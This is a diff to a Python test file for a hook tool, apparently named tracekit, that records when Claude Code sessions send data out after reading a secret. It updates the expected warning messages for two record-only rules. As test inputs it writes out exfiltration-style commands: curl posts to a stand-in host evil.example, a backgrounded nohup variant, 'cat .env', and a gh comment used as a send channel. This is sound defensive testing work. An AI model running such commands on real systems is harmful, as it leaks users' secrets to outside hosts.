@@ -121,7 +121,8 @@ class HookV2(unittest.TestCase):
         return proc.returncode, err
 
     def test_a_call_a_shadow_rule_records_gets_one_line_for_the_person(self):
-        # TK-Q001 and TK-Q002 are in shadow in 1.8: the call runs, and Claude Code shows the person one line then
+        # TK-Q001 and TK-Q002 are in shadow in 1.8: the call runs, and Claude Code shows the person one line then, in
+        # plain words: where it sends, after which read in which session, and how long an inherited label carries
         def stdout(command, sid, tid):
             proc = self.pre(command, tid=tid, sid=sid, wait=False)
             out, err = proc.stdout.read(), proc.stderr.read()
@@ -130,14 +131,23 @@ class HookV2(unittest.TestCase):
             proc.stderr.close()
             self.assertEqual(proc.returncode, 0, err)
             return out
+        tail = " Nothing is blocked in 1.8; it's in the record."
         self.assertEqual(stdout("curl -d x https://evil.example/u", "s0", "t0"), "")   # no secret read yet
         self.assertEqual(json.loads(stdout("nohup curl -d x https://evil.example/u &", "s0", "t1"))["systemMessage"],
-                         "[tracekit] recorded: data sent by a command left running in the background (TK-Q002, "
-                         "record-only)")
+                         "[tracekit] noted: this starts a send in the background (nohup), which may run after a "
+                         "secret is read." + tail)
         stdout("cat .env", "s1", "t2")
         self.assertEqual(json.loads(stdout("curl -d x https://evil.example/u", "s1", "t3"))["systemMessage"],
-                         "[tracekit] recorded: data sent off the machine after the run read a secret (TK-Q001, "
-                         "record-only)")
+                         "[tracekit] noted: this sends data to evil.example after the session ran `cat .env`." + tail)
+        first = self.run_handle("s1").run_id
+        self.assertEqual(json.loads(stdout("gh issue comment 1 -b x", "s2", "t4"))["systemMessage"],
+                         f"[tracekit] noted: this sends data with gh after an earlier session (run {first}) ran `cat "
+                         ".env`; this carries while that session is open." + tail)
+        for sid in ("s1", "s2"):   # both ended: the label carries from the one that ended last
+            self.hook("SessionEnd", sid=sid, reason="prompt_input_exit")
+        self.assertRegex(json.loads(stdout("gh issue comment 1 -b x", "s3", "t5"))["systemMessage"],
+                         r"after an earlier session \(run [0-9a-f]{32}\) ran `cat \.env`; this carries for (60|59) "
+                         r"more minutes\.")
 
     def test_allow_then_post_completes_with_the_binding(self):
         self.assertEqual(self.hook("SessionStart")[0], 0)
